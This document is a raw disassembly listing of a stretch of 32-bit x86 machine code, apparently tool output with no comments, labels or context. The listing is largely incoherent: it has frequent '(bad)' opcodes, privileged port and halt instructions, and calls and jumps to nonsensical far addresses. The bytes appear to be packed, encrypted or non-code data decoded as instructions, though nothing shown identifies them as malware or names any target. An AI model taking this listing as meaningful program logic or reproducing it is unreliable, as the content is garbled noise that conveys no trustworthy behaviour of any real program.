  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
